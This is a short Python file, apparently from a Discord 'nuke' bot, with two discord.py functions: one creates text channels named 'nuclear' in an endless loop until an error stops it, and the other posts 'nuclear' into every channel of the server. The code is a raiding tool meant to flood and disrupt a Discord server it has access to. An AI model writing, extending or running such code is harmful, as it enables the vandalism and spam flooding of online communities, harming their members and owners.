
import discord

async def radiation(ctx):
    while True:
        try:
            await ctx.guild.create_text_channel("nuclear")
        except Exception as e:
            print(e)
            break

async def dust(ctx):
    for channel in ctx.guild.channels:
        try:

            await channel.send("nuclear")

        except Exception as e:
            print(e)
            break